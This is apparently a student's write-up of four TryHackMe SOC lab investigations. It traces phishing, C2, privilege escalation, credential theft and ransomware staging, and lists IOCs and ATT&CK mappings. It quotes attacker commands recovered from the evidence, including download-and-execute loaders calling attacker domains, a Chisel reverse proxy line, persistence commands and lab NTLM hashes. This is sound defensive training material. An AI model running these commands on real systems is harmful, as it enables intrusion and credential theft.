# TryHackMe SOC L1 Capstone — Tempest & Boogeyman 1–3

## Overview

Four incident response investigations from the TryHackMe SOC Level 1 path. Each starts from a confirmed alert and requires reconstructing the full attack chain from endpoint, network, PowerShell, email, and memory evidence. Attack techniques span malicious documents, C2 tunnelling, privilege escalation, persistence, credential theft, lateral movement, and data exfiltration.

## Objective

For each incident: identify initial access, trace attacker activity through the environment, extract IOCs, and map behavior to MITRE ATT&CK.

## Tools Used

| Room | Tools |
|---|---|
| Tempest | Sysmon logs, Windows Event Logs, SysmonView, Event Viewer, EvtxECmd, Timeline Explorer, Wireshark |
| Boogeyman 1 | Thunderbird, LnkParse3, PowerShell logs (JSON), jq, Wireshark/tshark, base64 |
| Boogeyman 2 | Volatility 3 (memory dump), olevba, email analysis |
| Boogeyman 3 | ELK (Sysmon / Windows event logs) |

## Investigation

### 1. Tempest

**Initial access.** In SysmonView I found `chrome.exe` (PID 6596) and used it as the parent process filter in Timeline Explorer to identify the downloaded document `free_magicules.doc`. The affected host/user was `benimaru-TEMPEST`. Filtering on the document showed `WINWORD.EXE` (PID 496) opening it. Sysmon Event ID 22 (DNS) tied `phishteam.xyz` to `167.71.199.191`. The exploit was identified as CVE-2022-30190 (Follina) — see notes below.

**Execution and persistence.** Child processes of `WINWORD.EXE` ran a Base64-encoded PowerShell command. I decoded it and confirmed it downloaded `update.zip` into the user's Startup folder and expanded it:

```powershell
$app=[Environment]::GetFolderPath('ApplicationData');cd "$app\Microsoft\Windows\Start Menu\Programs\Startup"; iwr http://phishteam.xyz/02dcf07/update.zip -outfile update.zip; Expand-Archive .\update.zip -DestinationPath .; rm update.zip;
```

Filtering Event ID 1 for `explorer.exe` as parent and user `benimaru` revealed the command that runs at login and pulls the stage 2 payload:

```
powershell.exe -w hidden -noni certutil -urlcache -split -f "http://phishteam.xyz/02dcf07/first.exe" C:\Users\Public\Downloads\first.exe; C:\Users\Public\Downloads\first.exe
```

**Command and control.** Filtering DNS events (Event ID 22) on `first.exe` showed C2 at `resolvecyber.xyz:80`. In Wireshark, filtering HTTP GET requests to that host showed Base64-encoded URIs; C2 polled `/9ab62b5` with GET requests, returned command output in parameter `q`, and the User-Agent indicated the binary was written in Nim.

**Discovery and credential access.** Decoding the C2 traffic showed `netstat -ano -p tcp` output, with port 5985 (WinRM) listening, and a password (`infernotempest`) found in a sensitive file on the host.

**Tunnelling and lateral movement.** Decoded traffic showed `ch.exe` downloaded from `phishteam.xyz`. Timeline Explorer showed `first.exe` running:

```
C:\Users\benimaru\Downloads\ch.exe client 167.71.199.191:8080 R:socks
```

The SHA256 identified the tool as Chisel (reverse SOCKS proxy). The next process activity showed the harvested credentials used over WinRM.

**Privilege escalation.** A second binary, `spf.exe`, was identified by hash as PrintSpoofer, which abuses `SeImpersonatePrivilege`. It launched `final.exe`, which connected on port 8080 (different from the first C2 port) with SYSTEM privileges.

**Persistence as SYSTEM.** Windows Event ID 4720 showed accounts `shion` and `shuna` created; an earlier failed attempt was missing `/add`. `shion` was added to local administrators (Event ID 4732):

```
net localgroup administrators /add shion
```

Persistence was set with a service running `final.exe`:

```
sc.exe \\TEMPEST create TempestUpdate2 binpath= C:\ProgramData\final.exe start= auto
```

<details>
<summary>Evidence integrity (SHA256)</summary>

- `capture.pcapng`: `CB3A1E6ACFB246F256FBFEFDB6F494941AA30A5A7C3F5258C3E63CFA27A23DC6`
- `sysmon.evtx`: `665DC3519C2C235188201B5A8594FEA205C3BCBC75193363B87D2837ACA3C91F`
- `windows.evtx`: `D0279D5292BC5B25595115032820C978838678F4333B725998CFE9253E186D60`

</details>

### 2. Boogeyman 1

**Initial access (email).** The phishing email came from `agriffin@bpakcaging.xyz` (a domain resembling the business partner B Packaging Inc.) to `julianne.westcott@hotmail.com`. The DKIM-Signature and List-Unsubscribe headers pointed to Elastic Email as the relay. The attachment was password-protected (`Invoice2023!`) and contained `Invoice_20230103.lnk`. LnkParse3 exposed a Base64 (UTF-16LE) payload in the Command Line Arguments field, which decodes to:

```
iex (new-object net.webclient).downloadstring('http://files.bpakcaging.xyz/update')
```

**Execution and discovery.** PowerShell logs (parsed with `jq`) showed file hosting and C2 on `files.bpakcaging.xyz` and `cdn.bpakcaging.xyz`, and the enumeration tool Seatbelt being downloaded.

**Collection and exfiltration.** The attacker used `sq3.exe` to read the Sticky Notes database (`...\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`) and exfiltrated `protected_data.kdbx` (KeePass) using `nslookup` over DNS, hex-encoded.

**Network analysis.** In the packet capture, the file server was a Python HTTP server and C2 command output was returned via HTTP POST. I recovered the KeePass password and the stored card number from the exfiltrated data.

### 3. Boogeyman 2

**Initial access.** Phishing email from `westaylor23@outlook.com` to `maxine.beck@quicklogisticsorg.onmicrosoft.com`, attaching `Resume_WesleyTaylor.doc` (MD5 `52c4384a0b9e248b95804352ebec6c5b`).

**Execution.** The document's macro downloaded stage 2 from `https://files.boogeymanisback.lol/aa2a9c53cbb80416d3b47d85538d9971/update.png`, saved as `C:\ProgramData\update.js`, and executed by `wscript.exe` (PID 4260, PPID 1124). That script downloaded `update.exe` from the same path.

**Command and control.** From the memory dump, the malicious process was `C:\Windows\Tasks\updater.exe` (PID 6216) connecting to `128.199.95.189:8080`.

**Persistence.** A daily scheduled task was created right after the C2 callback, loading a Base64 payload from a registry value:

```
schtasks /Create /F /SC DAILY /ST 09:00 /TN Updater /TR 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -c "IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:\Software\Microsoft\Windows\CurrentVersion debug).debug)))"'
```

### 4. Boogeyman 3

Scope: incident window August 29–30, 2023. Investigated in ELK using Sysmon events (`winlog.event_id`: 1 process creation, 3 network connection).

**Execution.** `mshta.exe` (PID 6392) was the parent of the stage 1 `powershell.exe`. The payload was copied from the ISO to disk and executed:

```
xcopy.exe /s /i /e /h D:\review.dat C:\Users\EVAN~1.HUT\AppData\Local\Temp\review.dat
rundll32.exe D:\review.dat,DllRegisterServer
```

**Persistence and C2.** A PowerShell command using `New-ScheduledTaskAction` created a scheduled task named `Review`. Filtering Event ID 3 on `rundll32.exe*` showed the C2 connection to `165.232.170.151:80`.

**Privilege escalation.** `fodhelper.exe` was used for a UAC bypass, launching `rundll32.exe` with `review.dat`.

**Credential access and lateral movement.** PowerShell downloaded Mimikatz from GitHub (`mimikatz_trunk.zip`). A pass-the-hash execution used `itadmin` with NTLM hash `F84769D250EB95EB2D7D8B4A1C5613F2`. The attacker then read `IT_Automation.ps1` from the `ITFiles` share on `WKSTN-1327`, which contained hardcoded credentials (`QUICKLOGISTICS\allan.smith`). Using them with `Invoke-Command -ComputerName WKSTN-1327`, the remote execution showed `wsmprovhost.exe` as the parent process on the second host.

**Domain compromise and impact.** On the second host, Mimikatz was used again with `administrator:00f80f2538dcb54e7adc715c0e7091ec`. A DCSync targeted the `backupda` account in addition to `administrator`. Finally, PowerShell `iwr` downloaded `ransomboogey.exe` to the `evan.hutchinson` profile.

## Key IOCs

**Tempest**

| Type | Indicator |
|---|---|
| IP / Domains | `167.71.199.191` (`phishteam.xyz`), `resolvecyber.xyz:80` |
| URLs | `http://phishteam.xyz/02dcf07/free_magicules.doc`, `/update.zip`, `/first.exe`, `/ch.exe` |
| C2 pattern | URI `/9ab62b5`, parameter `q`, Base64 encoding, Nim user agent, `167.71.199.191:8080` (Chisel) |
| Files / hashes | `first.exe` `CE278CA242AA2023A4FE04067B0A32FBD3CA1599746C160949868FFC7FC3D7D8`; `ch.exe` (Chisel) `8A99353662CCAE117D2BB22EFD8C43D7169060450BE413AF763E8AD7522D2451`; `spf.exe` (PrintSpoofer) `8524FBC0D73E711E69D60C64F1F1B7BEF35C986705880643DD4D5E17779E586D`; `final.exe` (port 8080) |
| Accounts / service | `shion`, `shuna`, service `TempestUpdate2` |

**Boogeyman 1**

| Type | Indicator |
|---|---|
| Email | `agriffin@bpakcaging.xyz` |
| Domains | `files.bpakcaging.xyz`, `cdn.bpakcaging.xyz` |
| Files | `Invoice_20230103.lnk`, `sq3.exe`, `protected_data.kdbx`, Seatbelt |

**Boogeyman 2**

| Type | Indicator |
|---|---|
| Email | `westaylor23@outlook.com` |
| URLs | `https://files.boogeymanisback.lol/aa2a9c53cbb80416d3b47d85538d9971/update.png`, `.../update.exe` |
| IP | `128.199.95.189:8080` |
| Files / hash | `Resume_WesleyTaylor.doc` (MD5 `52c4384a0b9e248b95804352ebec6c5b`), `C:\ProgramData\update.js`, `C:\Windows\Tasks\updater.exe` |
| Persistence | Scheduled task `Updater` |

**Boogeyman 3**

| Type | Indicator |
|---|---|
| IP | `165.232.170.151:80` |
| URLs | `https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip`, `http://ff.sillytechninja.io/ransomboogey.exe` |
| Files | `review.dat`, `IT_Automation.ps1`, `ransomboogey.exe` |
| Processes | `mshta.exe`, `rundll32.exe`, `fodhelper.exe`, `mimikatz.exe`, `wsmprovhost.exe` |
| Persistence | Scheduled task `Review` |
| Hashes / accounts | `itadmin` `F84769D250EB95EB2D7D8B4A1C5613F2`; `administrator` `00f80f2538dcb54e7adc715c0e7091ec`; `allan.smith`; `backupda` |

## MITRE ATT&CK Mapping

| Technique | ID | Room(s) |
|---|---|---|
| Phishing: Spearphishing Attachment | T1566.001 | B1, B2, B3 |
| User Execution: Malicious File | T1204.002 | Tempest, B1, B2, B3 |
| Exploitation for Client Execution | T1203 | Tempest |
| Command and Scripting Interpreter: PowerShell | T1059.001 | All |
| Command and Scripting Interpreter: Visual Basic / JavaScript | T1059.005 / T1059.007 | B2 |
| System Binary Proxy Execution: Mshta / Rundll32 | T1218.005 / T1218.011 | B3 |
| Boot or Logon Autostart: Startup Folder | T1547.001 | Tempest |
| Scheduled Task | T1053.005 | B2, B3 |
| Create or Modify System Process: Windows Service | T1543.003 | Tempest |
| Create Account: Local Account | T1136.001 | Tempest |
| Account Manipulation | T1098 | Tempest |
| Access Token Manipulation: Token Impersonation | T1134.001 | Tempest |
| Abuse Elevation Control: Bypass UAC | T1548.002 | B3 |
| Ingress Tool Transfer | T1105 | All |
| Application Layer Protocol: Web Protocols | T1071.001 | Tempest, B1 |
| Data Encoding: Standard Encoding | T1132.001 | Tempest, B1 |
| Proxy | T1090 | Tempest |
| System Network Connections Discovery | T1049 | Tempest |
| Unsecured Credentials: Credentials in Files | T1552.001 | Tempest, B3 |
| OS Credential Dumping / DCSync | T1003 / T1003.006 | B3 |
| Use Alternate Authentication Material: Pass the Hash | T1550.002 | B3 |
| Remote Services: Windows Remote Management | T1021.006 | Tempest, B3 |
| Valid Accounts | T1078 | Tempest, B3 |
| Data from Local System | T1005 | B1 |
| Data from Network Shared Drive | T1039 | B3 |
| Exfiltration Over Alternative Protocol (DNS) | T1048.003 | B1 |

## Notes and Limitations

- **Tempest, CVE-2022-30190 (Follina):** identified from the behavior pattern (Word spawning PowerShell without macros). My notes do not show an `msdt.exe` process in the observed tree, so this attribution is inferred rather than directly verified from the logs.
- **Tempest, persistence:** my working notes referred to a scheduled task, but the command (`sc.exe ... create`) creates a Windows service, so it is mapped as one.
- **Tempest, credential discovery:** I used AI assistance to review decoded C2 parameters for anomalies; the name of the file containing the password was not recorded in my notes.
- **Boogeyman 1 and 2:** my notes record answers rather than the exact commands or Volatility plugins. The tool lists reflect the room's provided toolset. How the KeePass password was recovered is not documented.
- **Boogeyman 3:** the domain controller hostname is not identified in my notes, and the ransomware is only shown as downloaded, not executed.

## Conclusion

In Tempest, a Follina-style malicious document led to a Startup-folder payload, Nim-based HTTP C2, a Chisel reverse SOCKS proxy over WinRM, PrintSpoofer privilege escalation to SYSTEM, and service-based persistence. Boogeyman 1 and 2 showed phishing-delivered PowerShell/macro loaders leading to data theft over DNS (B1) and scheduled-task persistence (B2). Boogeyman 3 escalated to full domain compromise through a UAC bypass, Mimikatz pass-the-hash, remote share credential reuse, and DCSync, ending with an attempted ransomware download. Across all four, correlating parent-child process relationships with network artifacts was the key to reconstructing each chain.

## Disclaimer

These investigations were performed in controlled TryHackMe lab environments for educational purposes. All indicators, credentials, and data are simulated.
